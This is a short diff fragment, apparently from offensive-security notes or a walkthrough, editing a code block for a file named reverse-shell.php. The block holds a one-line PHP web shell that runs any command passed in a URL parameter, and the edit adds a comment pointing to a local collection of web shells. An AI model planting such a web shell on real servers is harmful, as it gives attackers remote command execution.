@@ -34,7 +34,7 @@ vim reverse-shell.php
 ```
 ```php
 <?php 
-  echo shell_exec($_GET['cmd']); # replace this line with a reverse shell
+  echo shell_exec($_GET['cmd']); # replace this line with a reverse shell from /usr/share/webshells
 ?>
 ```
 ```python
